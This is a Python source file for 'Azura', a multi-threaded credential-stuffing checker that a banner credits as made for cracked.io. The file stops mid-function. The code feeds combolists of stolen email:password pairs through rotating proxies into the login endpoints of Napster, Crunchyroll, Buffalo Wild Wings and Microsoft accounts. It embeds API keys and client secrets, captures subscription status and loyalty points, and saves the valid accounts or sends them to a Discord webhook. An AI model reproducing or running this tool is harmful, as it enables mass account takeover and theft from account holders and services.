import re
import base64
import uuid
import json
import wget
import ctypes
import random
import calendar
import threading
import datetime
from halo import Halo
from urllib.parse import quote
from bs4 import BeautifulSoup
from cloudscraper import create_scraper
from os import system, path, environ, mkdir, makedirs
from easygui import fileopenbox
from datetime import datetime
from yaml import safe_dump, safe_load
from pypresence import Presence
from Consolly import consoler
from time import time
from time import sleep, gmtime, strftime
from colorama import Fore, init
init()
now = datetime.now()
month_abr = calendar.month_abbr[int(now.strftime("%m"))]
unix = str(f'{month_abr} ─ {now.day} ─ {strftime("%Y")}, {strftime("%H-%M-%S")}')
name = 'xyy#3950'
console = consoler()
requests = create_scraper()

config_default = '''
#                                     /\                         
#                                    /  \    _____   _ _ __ __ _ 
#                                   / /\ \  |_  / | | | '__/ _` |
#                                  / ____ \  / /| |_| | | | (_| |
#                                 /_/    \_\/___|\__,_|_|  \__,_|
#                                         Made for all :-)

settings:
  azura:
    # Azura will check for the most recent update each time it is opened.
    updates: true # [true/false]

  console: 
    # Colors [white/blue/red/magenta/yellow/cyan/red/black]
    primary_color: 'cyan' 
    secundary_color: 'white'

  checker:
    # Every time a hit comes out it will be shown in the console
    print_hits: true # [true/false]

    # Accounts that are not working will be shown in console
    print_bads: true # [true/false]

    # Will automatically save accounts that are invalid
    save_bads: false # [true/false]

    # The type of proxy you will use is only accepted (IP:PORT) 
    # Valid proxy type (http/https/socks4/socks5)
    proxytype: 'socks4'

    # Threads for account checking
    threads: 200

    # The more timeout it will have, the more precision of hits it will have but it will be slower when checking
    timeout: 10000

  discord:
    # It will show what you are doing on discord with a personalized status in rich presence mode
    rich_presence: false # [true/false]
    
    webhook: # Disabled
      # Use discord webhook to send the results
      use: false # [true/false]

      # If you have activated the webhook option, put the url of your webhook
      webhook_url: 'http://'

      # When a hit comes out it will be sent automatically doing a @everyone to notify you
      mention_hits: false
      # When an invalid account comes out, it will mention with @everyone to notify you
      mention_bads: false
      
      # When it detects a hit it will be sent automatically to your webhook
      send_hits: true
      # When an invalid account is detected it will be automatically sent to your webhook
      send_bads: false
'''

if path.exists('Settings.yml'):
    settings = safe_load(open('Settings.yml', 'r', errors='ignore'))
else:
    open('Settings.yml', 'w').write(config_default)
    settings = safe_load(open('Settings.yml', 'r', errors='ignore'))

class Azura:
    version = '1.0'
    updates = bool(settings['settings']['azura']['updates'])
    color_primary = str(settings['settings']['console']['primary_color'])
    secundary_color = str(settings['settings']['console']['secundary_color'])

    timeout = int(settings['settings']['checker']['timeout'])
    threads = int(settings['settings']['checker']['threads'])
    print_bads = bool(settings['settings']['checker']['print_bads'])
    print_hits = bool(settings['settings']['checker']['print_hits'])
    proxy_type = str(settings['settings']['checker']['proxytype'])
    save_bads = bool(settings['settings']['checker']['save_bads'])

    rpc = bool(settings['settings']['discord']['rich_presence'])
    use_webhook = bool(settings['settings']['discord']['webhook']['use'])
    webhook_url = str(settings['settings']['discord']['webhook']['webhook_url'])
    webhook_send_hits = bool(settings['settings']['discord']['webhook']['send_hits'])
    webhook_send_bads = bool(settings['settings']['discord']['webhook']['send_bads'])
    hit_mention = bool(settings['settings']['discord']['webhook']['mention_hits'])
    bad_mention = bool(settings['settings']['discord']['webhook']['mention_bads'])

    def GetColor():
        if Azura.color_primary == 'red':
            return Fore.LIGHTRED_EX
        elif Azura.color_primary == 'white':
            return Fore.LIGHTWHITE_EX
        elif Azura.color_primary == 'blue':
            return Fore.LIGHTBLUE_EX
        elif Azura.color_primary == 'magenta':
            return Fore.LIGHTMAGENTA_EX
        elif Azura.color_primary == 'yellow':
            return Fore.LIGHTYELLOW_EX
        elif Azura.color_primary == 'cyan':
            return Fore.LIGHTCYAN_EX
        elif Azura.color_primary == 'black':
            return Fore.LIGHTBLACK_EX
        else:
            return Fore.LIGHTWHITE_EX

    def GetColor2():
        if Azura.secundary_color == 'red':
            return Fore.LIGHTRED_EX
        elif Azura.secundary_color == 'white':
            return Fore.LIGHTWHITE_EX
        elif Azura.secundary_color == 'blue':
            return Fore.LIGHTBLUE_EX
        elif Azura.secundary_color == 'magenta':
            return Fore.LIGHTMAGENTA_EX
        elif Azura.secundary_color == 'yellow':
            return Fore.LIGHTYELLOW_EX
        elif Azura.secundary_color == 'cyan':
            return Fore.LIGHTCYAN_EX
        elif Azura.secundary_color == 'black':
            return Fore.LIGHTBLACK_EX
        else:
            return Fore.LIGHTWHITE_EX

color_primary = Azura.GetColor()
secundary_color = Azura.GetColor2()

text = f'''                          
\t\t\t\t\t{color_primary}      /\  {secundary_color}                       
\t\t\t\t\t{color_primary}     /  \ {secundary_color}   _____   _ _ __{color_primary} __ _ 
\t\t\t\t\t{color_primary}    / /\ \{secundary_color}  |_  / | | | '__/{color_primary} _` |
\t\t\t\t\t{color_primary}   / ____ \{secundary_color}  / /| |_| | | {color_primary}| (_| |
\t\t\t\t\t{color_primary}  /_/    \_\{secundary_color}/___|\__,_|_|  {color_primary}\__,_|

\t\t\t\t\t{secundary_color}Made for {color_primary}cracked.io{secundary_color} by {color_primary}{name}{secundary_color} with {color_primary}♥'''

class Counters:
    total = 0
    checked = 0
    cpm = 0
    total_proxies = 0
    errors = 0
    hits = 0
    bad = 0
    free = 0
    premium = 0
    retries = 0
    checked = 0
    locked = 0

class AzuraChecker:
    def __init__(self):
        self.combo = []
        self.proxies = []
        self.stop_time = True
        self.current_module = None
        self.mod = ''
        self.current_proxy = ''
        self.Presence = False
        self.cpm = 0
        self.start_time = 0
        self.points = 0
        self.cracked_name = 'User'
        self.all_in_one_path = f'results/{unix}'
        self.check_all = False

        if Azura.rpc == False:
            self.Presence = False
        else:
            self.ConnectRichPresence()
        self.get_update()
        self.Main()
        
    def bs4(self, auth: str, type: str):
        if type == 'encoding':
            message = auth
            message_bytes = message.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            return base64_bytes.decode('ascii')
        elif type == 'decoding':
            base64_message = auth
            base64_bytes = base64_message.encode('ascii')
            message_bytes = base64.b64decode(base64_bytes)
            message = message_bytes.decode('ascii')
            return message

    def ComboLoad(self):
        file = fileopenbox(
            title='Select your combolist'
        )
        with open(file, encoding='utf-8', errors='ignore') as f:
            for i in f:
                self.combo.append(i.split('\n')[0])
                Counters.total += 1

    def ProxyLoad(self):
        file = fileopenbox(
            title='Select your proxy list'
        )
        with open(file, encoding='utf-8', errors='ignore') as f:
            for i in f:
                proxys = i.split('\n')[0]
                if Azura.proxy_type == 'https':
                    self.proxies.append({'http': f"http://{proxys}", 'https': f"https://{proxys}"})
                    self.current_proxy = 'https'
                elif Azura.proxy_type == 'http':
                    self.proxies.append({'http': f"http://{proxys}", 'https': f"https://{proxys}"})
                    self.current_proxy = 'http'
                elif Azura.proxy_type == 'socks4':
                    self.proxies.append({'http': f"{Azura.proxy_type}://{proxys}", 'https': f"{Azura.proxy_type}://{proxys}"})
                    self.current_proxy = 'socks4'
                elif Azura.proxy_type == 'socks5':
                    self.proxies.append({'http': f"{Azura.proxy_type}://{proxys}", 'https': f"{Azura.proxy_type}://{proxys}"})
                    self.current_proxy = 'socks5'
                else:
                    self.proxies.append({'http': f"http://{proxys}", 'https': f"https://{proxys}"})
                    self.current_proxy = 'https [error get]'
                Counters.total_proxies += 1
            
    def ConnectRichPresence(self):
        if Azura.rpc == True:
            try:
                self._presence = Presence(1082783646785753139)
                self._presence.connect()
                self.Presence = True
            except:
                self.Presence = False
        else:
            self.Presence = False
    
    def UpdateRich(self, state: str=None, details: str=None):
        if self.Presence == True:
            self._presence.update(
                state=state,
                details=details,
                large_image='azura'
            )
    
    def rpc(self):
        while True:
            try:
                self.UpdateRich(state=f'{self.mod}', details=f'Hits: {Counters.hits} ~ Bad: {Counters.bad} ~ CPM: {Counters.cpm}')
            except:
                pass

    def cpm_counter(self):
        while self.stop_time:
            if Counters.checked >= 1:
                now = Counters.checked
                sleep(1)
                Counters.cpm = (Counters.checked - now) * 20
    
    def get_update(self):
        if Azura.updates == True:
            try:
                g = requests.get('https://raw.githubusercontent.com/beeteo/Azura/main/version.json').json()['v']
                if Azura.version == g:
                    pass
                else:
                    value = ctypes.windll.user32.MessageBoxW(0, f'New update detected\n\n{Azura.version} -> {g}\n\nDo you want to download it?', 'Azura Updater', 4)
                    if int(value) == 7:
                        pass
                    else:
                        console.clear()
                        print(text)
                        print(f'{secundary_color}[{color_primary}>{secundary_color}] {color_primary}Starting Download...')
                        sleep(1.2)
                        with Halo(text=f'{secundary_color}[{color_primary}>{secundary_color}] Downloading', spinner='dots', placement='right'):
                            wget.download(url='https://github.com/beeteo/Azura/archive/refs/heads/main.zip', bar=None)
                        print(f'{secundary_color}[{color_primary}>{secundary_color}] {color_primary}Finished')
                        sleep(0.8)
                        print(f'{secundary_color}[{color_primary}>{secundary_color}] {color_primary}Exiting bro')
                        sleep(1)
                        quit()
            except Exception as e:
                print(e)
    
    def update_title(self):
        while self.stop_time:
            console.set_title(
                f'Azura ━ {self.mod} ━ Hits: {Counters.hits} ━ Bad: {Counters.bad}'
                f'{"" if Counters.premium == 0 else f" ━ Premium: {Counters.premium}"}'
                f'{"" if Counters.free == 0 else f" ━ Free: {Counters.free}"}'
                f'{"" if Counters.free == 0 else f" ━ Locked: {Counters.locked}"}'
                f' ━ Remaining: {Counters.total - Counters.checked}/{Counters.total}'
                f' | Retries: {Counters.retries}'
                f' ━ CPMs: {Counters.cpm}'
                f' ━ Time Elapsed: {self.now_time()}'
            )

    def now_time(self):
        return strftime("%H:%M:%S", gmtime(time() - self.start_time))
    
    def Webhook_send(self, webhook, hit: str=None):
        if Azura.hit_mention == True:
            mention = '@everyone'
        else:
            mention = ''

        json = {
            "content": mention,
            "embeds": [{"description": f"`ComboLines`: {Counters.total}\n`ProxyLines`: {Counters.total_proxies}\n\n`Checked`: {Counters.checked}\nRemainings: {Counters.total - Counters.checked}\n`CPM`: {Counters.cpm}\n\n`hits`: {Counters.hits}\n`bad`: {Counters.bad}\n`premiums`: {Counters.premium}\n`frees`: {Counters.free}\n\n{hit}", "color": 0x57845,"author": {"name": f"{self.mod} - Azura"},"footer": {"text": f"Elapsed: {self.now_time()} - Azura AIO - {self.mod}"}}],
            "attachments": []
        }
        pool = requests.post(webhook, json=json)

    def NapsterCheck(self, email, password):
        try:
            sess = requests
            proxy = random.choice(self.proxies)
            sess.proxies.update(proxy)
            headers = {
            "User-Agent": "Napster/3537 CFNetwork/1120 Darwin/19.0.0",
            "Host": "playback.rhapsody.com",
            "appId": "com.rhapsody.iphone.Rhapsody3",
            "appVersion": "6.5",
            "cpath": "app_iPad7_4",
            "deviceid": "4387508C-483B-479A-BBC1-E078269AE0S4",
            "ocode": "tablet_ios",
            "package_name": "com.rhapsody.iphone.Rhapsody3",
            "pcode": "tablet_ios",
            "playerType": "ios_6_5",
            "provisionedMCCMNC": "310+150",
            "rsrc": "ios_6.5",
            "Content-Type": "application/x-www-form-urlencoded"
            }
            payload = {
            "username": str(email), 
            "password": str(password), 
            "devicename": "Elite Money", 
            "provisionedMCCMNC": "310+150", 
            "package_name": "com.rhapsody.iphone.Rhapsody3"
            }
            data = sess.post(
            url='https://playback.rhapsody.com/login.json',
            headers=headers,
            data=payload,
            timeout=Azura.timeout,
            proxies=proxy
            )
            
            if '"INVALID_USERNAME_OR_PASSWORD"' in data.text:
                Counters.checked += 1
                Counters.bad += 1
                if Azura.print_bads == True:
                    print(f'{Fore.RED}|{Fore.LIGHTWHITE_EX} {email}:{password}')
                else:
                    pass
                if Azura.save_bads == True:
                    open(f'results/Napster/{unix}/bads.txt', 'a').write(f'{email}:{password}\n')
                else:
                    pass
            elif '"accountType"' in data.text:
                Counters.checked += 1
                Counters.hits += 1
                parser = data.json()
                if parser["data"]["accountType"] == "RHAPSODY_25":
                    Counters.free += 1
                    open(f'results/Napster/{unix}/Free-Capture.txt', 'a').write(f'{email}:{password} | Account Type: {parser["data"]["accountType"]} | Country: {parser["data"]["country"]}\n')
                    open(f'results/Napster/{unix}/Free-RAW.txt', 'a').write(f'{email}:{password}\n')
                else:
                    open(f'results/Napster/{unix}/Premium-Capture.txt', 'a').write(f'{email}:{password} | Account Type: {parser["data"]["accountType"]} | Country: {parser["data"]["country"]}\n')
                    open(f'results/Napster/{unix}/Premium-RAW.txt', 'a').write(f'{email}:{password}\n')
                    Counters.premium += 1

                print(f'{Fore.LIGHTGREEN_EX}| {color_primary}{email}:{password} {secundary_color}| {color_primary}Account Type: {secundary_color}{parser["data"]["accountType"]}{color_primary} - Country: {secundary_color}{parser["data"]["country"]}{Fore.RESET}')
            else:
                Counters.retries += 1
        except Exception as e:
            Counters.errors += 1

    def CrunchyCheck(self, email, password):
        try:
            sess = requests
            proxy = random.choice(self.proxies)
            sess.proxies.update(proxy)
            data = sess.post(
                url='https://api.crunchyroll.com/start_session.0.json', 
                proxies=proxy,
                timeout=int(Azura.timeout),
                data={
                'version': '1.0', 
                'access_token': 'LNDJgOit5yaRIWN',       
                'device_type': 'com.crunchyroll.windows.desktop', 
                'device_id': 'AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId', 
                'account': email, 
                'password': password
                }
            )
            if "session_id" in data.text:
                cookies = json.loads(data.text)
                coodata = cookies["data"]
                coodata = coodata["session_id"]

                r = sess.post(
                    url = 'https://api.crunchyroll.com/login.0.json',
                    proxies=proxy,
                    timeout=int(Azura.timeout),
                    data={
                    'account': email, 
                    'password': password, 
                    'session_id': coodata
                    }
                )
                info = json.loads(r.text)

                if info["code"] == "ok":
                    Counters.checked += 1
                    Counters.hits += 1
                    data = info["data"]
                    userdata = data["user"]
                    expire = data["expires"]
                    name = userdata["username"]
                    subscription = userdata["access_type"]
                    if name is None:
                        username = 'Username has not been set'
                    else:
                        username = name
                    
                    if subscription is None:
                        Counters.free += 1
                        sub = 'Free'
                    else:
                        Counters.premium += 1
                        sub = subscription
                    
                    if Azura.print_hits == True:
                        print(f'{Fore.LIGHTGREEN_EX}| {color_primary}{email}:{password} {secundary_color}| {color_primary}Premium: {secundary_color}{subscription}{secundary_color} ~ {color_primary}Expires: {secundary_color}{expire}{secundary_color} ~ {color_primary}Username: {secundary_color}{name}{secundary_color}')
                    else:
                        pass

                    detailed = f'''->->->->->->->->->->\n> Email: {email}\n> Password: {password}\n> Username: {name}\n> Subscription: {sub}\n> Expires: {expire}\n'''
                    
                    if self.check_all == True:
                        if subscription is None:
                            open(f'results/{unix}/Crunchyroll-Free.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} | Premium: {subscription} ~ Username: {username}\n')
                        else:
                            open(f'results/{unix}/Crunchyroll-Premiums.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} | Premium: {subscription} ~ Expires: {expire} ~ Username: {username}\n')
                        
                        open(f'results/{unix}/RAW-hits.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                        open(f'results/{unix}/Detailed-hits.txt', 'a', encoding='UTF-8', errors='ignore').write(detailed)
                    else:
                        if subscription is None:
                            open(f'results/Crunchyroll/{unix}/Crunchyroll-Free.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} | Premium: {subscription} ~ Username: {username}\n')
                        else:
                            open(f'results/Crunchyroll/{unix}/Crunchyroll-Premiums.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} | Premium: {subscription} ~ Expires: {expire} ~ Username: {username}\n')
                        
                        open(f'results/Crunchyroll/{unix}/Crunchy-RAW-hits.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                        open(f'results/Crunchyroll/{unix}/Crunchy-Detailed-hits.txt', 'a', encoding='UTF-8', errors='ignore').write(detailed)

                    if Azura.use_webhook == True:
                        try:
                            self.Webhook_send(webhook=Azura.webhook_url, hit=f'{email}:{password} | Expires: {expire} | Premium: {subscription}')
                        except:
                            pass

                elif "The owner of this website (api.crunchyroll.com) has banned you temporarily from accessing this website." in data.text:
                    Counters.checked += 1
                    Counters.retries += 1
                else:
                    if info["message"] == "Incorrect login information.":
                        Counters.checked += 1
                        Counters.bad += 1
                        if Azura.print_bads == True:
                            print(f'{Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{email}:{password}')
                        elif Azura.print_bads == False:
                            pass
                        else:
                            pass
                        if Azura.save_bads == True:
                            if self.check_all == True:
                                open(f'results/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                            else:
                                open(f'results/Crunchyroll/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                        elif Azura.save_bads == False:
                            pass
                        else:
                            pass
                    elif info['message'] == 'You forgot to put in your User Name or Email.':
                        Counters.checked += 1
                        Counters.bad += 1
                        if Azura.print_bads == True:
                            print(f'{Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{email}:{password}')
                        elif Azura.print_bads == False:
                            pass
                        else:
                            pass
                        if Azura.save_bads == True:
                            if self.check_all == True:
                                open(f'results/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                            else:
                                open(f'results/Crunchyroll/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                        elif Azura.save_bads == False:
                            pass
                        else:
                            pass
                    elif info['message'] == 'You forgot to put in your password.':
                        Counters.checked += 1
                        Counters.bad += 1
                        if Azura.print_bads == True:
                            print(f'{Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{email}:{password}')
                        elif Azura.print_bads == False:
                            pass
                        else:
                            pass
                        if Azura.save_bads == True:
                            if self.check_all == True:
                                open(f'results/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                            else:
                                open(f'results/Crunchyroll/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                        elif Azura.save_bads == False:
                            pass
                        else:
                            pass
                    elif info['message'] == 'Your account has been temporarily locked. Please try again later or contact us.':
                        Counters.locked += 1
                        open(f'results/Crunchyroll/{unix}/Locked.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                    else:
                        print('{}> {}'.format(Fore.LIGHTRED_EX, info['message']))
            else:
                print('> {}'.format(info.text))
        except Exception as e:
            Counters.retries += 1
    
    def BuffaloCheck(self, email, password):
        json={
            'email': email,
            'password': password,
            'returnSecureToken': True
        }
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0',
            'Content-Type': 'application/json'
        }
        sess = requests
        proxy = random.choice(self.proxies)
        sess.proxies.update(proxy)

        response = sess.post(
            url='https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4',
            json=json,
            headers=headers,
            proxies=proxy,
            timeout=int(Azura.timeout)
        )
        if 'idToken' in response.text:
            Counters.checked += 1
            Counters.hits += 1

            try:
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {response.json()["idToken"]}'
                }
                
                data = {
                    'data': {
                    'version': '6.38.44',
                    'platform': 'ios',
                    'recaptchaToken': 'none'
                }
                }
                
                capture = requests.post(
                    url='https://us-central1-buffalo-united.cloudfunctions.net/getSession',
                    json=data,
                    headers=headers
                )
                profile_id = re.search('"ProfileId":"(.*?)"', capture.text).group(1)
                access_token = re.search('"AccessToken":"(.*?)"', capture.text).group(1)
                headers = {
                    'Authorization': f'OAuth {access_token}',
                    'X_CLIENT_ID': '4171883342bf4b88aa4b88ec77f5702b',
                    'X_CLIENT_SECRET': '786c1B856fA542C4b383F3E8Cdd36f3f'
                }
                buff_capture = requests.get(
                    f'https://api.buffalowildwings.com/loyalty/v1/profiles/{profile_id}/pointBalance?status=A',
                    headers=headers
                )
                if 'PointAmount' in buff_capture.text:
                    point_amount = re.search('"PointAmount":(.*?),', buff_capture.text).group(1)
                    print(f'{Fore.LIGHTGREEN_EX}| {color_primary}{email}:{password} {secundary_color}| {color_primary}Points: {secundary_color}{point_amount} ~ {color_primary}Name: {secundary_color}{response.json()["displayName"]}')
                    if self.check_all == True:
                        open(f'results/{unix}/Buffalo-Hits-Capture.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} - Points: {point_amount} - Name: {response.json()["displayName"]}\n')
                    else:
                        open(f'results/Buffalo/{unix}/Buffalo-Hits-Capture.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} - Points: {point_amount} - Name: {response.json()["displayName"]}\n')
                else:
                    print(f'{Fore.LIGHTGREEN_EX}| {color_primary}{email}:{password} {secundary_color}| {color_primary}Points: {secundary_color}Failed Capture ~ {color_primary}Name: {secundary_color}{response.json()["displayName"]}')
                    if self.check_all == True:
                        open(f'results/{unix}/Buffalo-Hits-Name.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} - Name: {response.json()["displayName"]}\n')
                    else:
                        open(f'results/Buffalo/{unix}/Hits-Name.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} - Name: {response.json()["displayName"]}\n')
            except Exception as e:
                print(f'{Fore.LIGHTGREEN_EX}| {color_primary}{email}:{password}')
                if self.check_all == True:
                    open(f'results/{unix}/Buffalo-RAW-Hits.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                else:
                    open(f'results/Buffalo/{unix}/Buffalo-RAW-Hits.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')

        elif '"{"success" : false}' in response.text:
            Counters.bad += 1
            Counters.checked += 1
            if Azura.print_bads == True:
                print(f'{Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{email}:{password}')
            elif Azura.print_bads == False:
                pass
            else:
                pass
            if Azura.save_bads == True:
                open(f'results/Buffalo/{unix}/bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
        elif '"message": "EMAIL_NOT_FOUND",' in response.text:
            Counters.bad += 1
            Counters.checked += 1
            if Azura.print_bads == True:
                print(f'{Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{email}:{password}')
            elif Azura.print_bads == False:
                pass
            else:
                pass
            if Azura.save_bads == True:
                open(f'results/Buffalo/{unix}/bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
        elif '"message": "INVALID_PASSWORD",':
            Counters.bad += 1
            Counters.checked += 1
            if Azura.print_bads == True:
                print(f'{Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{email}:{password}')
            elif Azura.print_bads == False:
                pass
            else:
                pass
            if Azura.save_bads == True:
                open(f'results/Buffalo/{unix}/bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
        else:
            Counters.retries += 1
            
    def AzureCheck(self, email, password):
        sess = requests
        proxy = random.choice(self.proxies)
        sess.proxies.update(proxy)
        headers = {
            "COOKIE":"MSCC=104.140.14.155-US; uaid=fd1cbab376f144c196df5e9a23b38c46; cltm=nw: 2G-Slow; wlidperf=FR=L&ST=1589791817268; MSPOK=$uuid-f848f7a5-4f3b-4231-adc6-a1c149718e66$uuid-9a62249b-a69e-49c3-9c99-d723a8e568f3$uuid-07a0af7f-2dc6-4bfb-abb8-097ab40240ed$uuid-a6f0d4d6-5bce-449c-96af-3a1d4b7105a8$uuid-dd210cd0-9e62-4b28-b8a8-3580ebc2e571$uuid-f16f2879-7838-419b-ba57-4250c9addf5a$uuid-f3d25d16-bece-47ee-b829-f4b890d3111e"
        }
        
        data = {
            "i13": "1",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "1",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": password,
            "KMSI": "on",
            "ps": "2",
            "psRNGCDefaultType": "",
            "psRNGCEntropy": "",
            "psRNGCSLK": "",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": "DVh*4QvMI6bRTd4YnaA22707UG83ZOsAKbFkML!OJZVR!dJXv0H!Z7aTtmWTiWWVoRJTKBwmJbhP3VG64I9RmYoDGkNjNq4kZI6RIMLkdEowptHxelObKh3aerc4DgRM8lwI7VlZbQX!UNrsFdafA!uRNTxhF3FBk5FQ35fplXbyVxOCPq4UZkgra4!SAh*POXBL9*W7dplWmbNCNZdIW90$",
            "PPSX": "P",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "i2": "1",
            "i17": "0",
            "i18": "",
            "i19": "5892"
        }
        
        get_ids = sess.post(
            url='https://login.live.com/ppsecure/post.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https://login.microsoftonline.com/common/federation/oauth2&state=rQIIAX2RO2_TUACFc5vUNFElKujAwNCBiTaJ77WvE1vqkHdIcvMOxlkix7WJnfiBfZOQbMDChCoGho5MqGMREmKFqYDUOb8AMSGEEAMDyR9gOcM5n3Skc-6GYQJKdxCHEZfCOM6paBjnoabGRQ7iuJGGBmdgQVBF7N-I7b1CzPhF2c5e_Pr66d3L39EzEB1MzJme0Fz7HNweUeoFUjKpLqe-nrBNzXcD16CbNPkegCsAvgFwvhUIXAryIi8gkYcCn8IpmGjIbatvFTCxC1RZjlllwbJKV1vW5KLZ6PYoyRPYt3q4bpGFggivLDWedFusIrcoQXVzw9dlAmvd0bhvr718Yd4oVUZ1uTevd4v2aut6IzOlI7QR1zeX-s-tqOH69sBzA3oWfgoanu7cO8m5jqNrNLHBdIeamkpN12n6rqf71NSDY4tg3FUfssKUqEKqthDS-fbjB_VJu-R56TaxZs74vix0cJPMc8Ogs5x4sm4b0xn_KIv8Gm0KIy6TR3keVppl0pl7uUG-klFEuxQEF2FmvZTtOpfh_XWfY54c6bZqTo483zXMiX4VAd8ju2xY2tmJ7YVuhQ5CfyLg9fb6l5X68eaz8ZfSm8yTt5__7oYut5NBj7cOJ9mi02ovqlV9xjnlmt9pyJqXc-c9cZRVDufDapElQusYS_CUAacM84MBz6-FPkT_--Qqto9YxMZZGIfpA4gkCCUu1f8H0&estsfed=1&fci=23523755-3a2b-41ca-9315-f81f3f566a95&mkt=de-DE&username=<USER>&contextid=18EFE5D08A7839E1&bk=1579349616&uaid=6b063296488e426db2f4cdc4b592f609&pid=15216',
            data=data,
            headers=headers,
            proxies=proxy,
            timeout=int(Azura.timeout)
        )
        
        soup = BeautifulSoup(get_ids.text, 'html.parser')
        try:
            uaid = soup.find('input', {'id': 'uaid'}).get('value')
            pprid = soup.find('input', {'name': 'pprid'}).get('value')
            ipt = soup.find('input', {'id': 'ipt'}).get('value')
            
            parm = {
                "ipt": ipt,
                "pprid": pprid,
                "uaid": uaid
            }
            data = sess.post(
                url=r"https://account.live.com/recover?mkt=EN-US&uiflavor=web&client_id=1E00004417ACAE&id=293577&lmif=80&ru=https://login.live.com/oauth20_authorize.srf%3fuaid%3dfd1cbab376f144c196df5e9a23b38c46%26opid%3d6265C48F0F819D9D%26opidt%3d1589791817",
                data=parm,
                proxies=proxy,
                timeout=int(Azura.timeout)
            )
            
            if 'Help us secure your account' in data.text:
                Counters.hits += 1
                Counters.free += 1
                open(f'results/Azure/{unix}/RAW-hits.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
            elif 'Helfen Sie uns, Ihr Konto zu sichern' in data.text:
                Counters.hits += 1
                Counters.free += 1
                open(f'results/Azure/{unix}/RAW-hits.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
            elif 'Your account or password is incorrect' in data.text:
                Counters.checked += 1
                Counters.bad += 1
                if Azura.save_bads == True:
                    open(f'results/Azure/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                elif Azura.save_bads == False:
                    pass
                else:
                    pass
            elif 'If you no longer know your password' in data.text:
                Counters.checked += 1
                Counters.bad += 1
                if Azura.save_bads == True:
                    open(f'results/Azure/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                elif Azura.save_bads == False:
                    pass
                else:
                    pass
            elif 'This Microsoft account does not exist. Please enter a different account' in data.text:
                Counters.checked += 1
                Counters.bad += 1
                if Azura.save_bads == True:
                    open(f'results/Azure/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                elif Azura.save_bads == False:
                    pass
                else:
                    pass
            elif 'Ihr Konto oder Kennwort ist nicht korrekt' in data.text:
                Counters.checked += 1
                Counters.bad += 1
                if Azura.save_bads == True:
                    open(f'results/Azure/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                elif Azura.save_bads == False:
                    pass
                else:
                    pass
            elif 'Wenn Sie Ihr Kennwort nicht mehr wissen' in data.text:
                Counters.checked += 1
                Counters.bad += 1
                if Azura.save_bads == True:
                    open(f'results/Azure/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                elif Azura.save_bads == False:
                    pass
                else:
                    pass
            elif 'Dieses Microsoft-Konto ist nicht vorhanden. Geben Sie ein anderes Konto ein' in data.text:
                Counters.checked += 1
                Counters.bad += 1
                if Azura.save_bads == True:
                    open(f'results/Azure/{unix}/Bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
                elif Azura.save_bads == False:
                    pass
                else:
                    pass
            else:
                if 'JavaScript required to sign in' in data.text:
                    Counters.retries += 1
                elif 'JavaScript required for registration' in data.text:
                    Counters.retries += 1
                elif 'JavaScript für die Anmeldung erforderlich' in data.text:
                    Counters.retries += 1
                else:
                    Counters.retries += 1
        except:
